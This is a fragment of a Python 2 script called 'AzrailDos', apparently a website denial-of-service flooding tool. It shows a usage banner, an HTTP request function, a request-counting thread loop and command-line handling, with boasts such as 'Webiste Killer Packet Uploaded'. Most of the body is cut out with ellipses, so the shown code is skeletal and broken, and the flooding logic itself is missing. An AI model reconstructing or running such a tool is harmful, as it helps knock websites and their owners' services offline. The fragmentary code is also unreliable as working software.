...
def usage():
	print '---------------------------------------------------'
	print "             AzrailDos.py <url>                    "
	print 'AzrailDos Created By --EyuB@@-----Centr@s7---------'
	print "\a"
print \
"""    
          ...
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print 'AzrailDos Webiste Killer Packet Uploaded'
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Paket Yukleniyor AzrailDos" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -Azrail Dos Hits are secced"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "AzrailDos attack was been sended This tool is created by : Eyub@@ & Centr@s7"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
